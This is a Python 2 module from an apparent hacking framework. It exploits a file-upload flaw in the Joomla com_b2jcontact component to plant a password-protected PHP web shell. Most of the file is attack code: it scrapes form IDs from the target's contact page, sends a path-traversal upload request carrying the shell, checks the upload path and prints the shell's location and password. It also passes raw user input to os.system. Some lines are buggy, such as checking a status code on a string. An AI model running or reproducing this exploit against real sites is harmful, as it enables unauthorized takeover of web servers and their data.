# -*- coding: utf-8 -*-

'''
Joomla Component com_b2jcontact Shell Upload
Coded By ./Xi4u7
AndroSec1337 Cyber Team
https://facebook.com/Xi4u7
'''

import os
import subprocess
from core.wcolors import color
from core import help
from time import sleep
from core import log
from core import wcolors
from core import about
import requests
import re
options = ["http://test.com/"]

def b2j():
	try:
		line_1 = color.RED + "[" + color.CYAN + "XioChi" + color.RED + "]" +  color.ENDC
		line_1 += color.RED + "[" + color.CYAN + "joomla/com_b2jcontact" + color.RED + "]>> " + color.ENDC
		com = raw_input(line_1)
		com = com.lower()
		if com[0:10] =='set target':
			target_ip = com[11:40]
			options[0] = target_ip
			print color.RED + "[" + color.CYAN + "Target" + color.RED + "]>> " + options[0]
			b2j()
		elif com[0:12] =='show options':
			print ""
			print wcolors.color.CYAN+"Options\t\t Value\t\t\tRQ\t Description"
			print wcolors.color.RED+"---------\t--------------\t\t------------------"
			print wcolors.color.CYAN+"Target\t\t"+options[0]+"\tyes\tTarget ip addres"
			b2j()
		elif com[0:2] =='os':
			log.logger.single("Command Executed", "\n"+color.CYAN)
			os.system(com[3:])
			b2j()
		elif com[0:4] =='help':
			help.help()
			b2j()
		elif com[0:4] =='back':
			pass
		elif com[0:5] =='about':
			about.about()
			b2j()
		elif com[0:3] =='run':
			try:
				log.logger.attack('Joomla Component b2jcontact Exploit')
				file = open("core/shell/XioChi.php","rb")
				url = options[0]
				kontent = requests.get(url+'/contact')
				getcid = re.findall('name="cid_(.*?)"', kontent.text)
				if getcid:
					print("cid value : "+str(getcid))
				else:
					print("cid value : null value")
				getbid = re.findall('bid=(.*?)"', kontent.text)
				if getbid:
					print("bid value : "+str(getbid))
				else:
					print("bid value : null value")
				try:
					exploit = url + 'index.php?option=com_b2jcontact&amp;view=loader&amp;owner=component&amp;id='+str(getcid)+'&amp;bid='+str(getbid)+'&amp;root=&type=uploader&&owner=component&id='+str(getcid)+'&qqfile=586cfc73826e4-/../XioChi.php';
					uploader = open('core/shell/XioChi.php').read()
					header = {'Content_Type':'multipart/form-data', 'Content': uploader}
					poster = requests.post(exploit, headers=header)
					path = url + "/components/com_b2jcontact/uploads/XioChi.php"
					checker = requests.get(path)
					if "200" in path.status_code:
						log.logger.attacksukses("Vulnerable")
						log.logger.attacksukses("Shell Path : "+path)
						log.logger.attacksukses("Password Shell : jancox")
					else:
						log.logger.error("Not Vulnerable! Exploit Failed")
				except Exception as e:
					print(e)
					b2j()
			except Exception as err:
				log.logger.error(str(err))
		else:
			print color.RED + "[" + color.CYAN + "Wrong Command" + color.RED + "]>>" + com
			b2j()
	except(KeyboardInterrupt):
		print ""
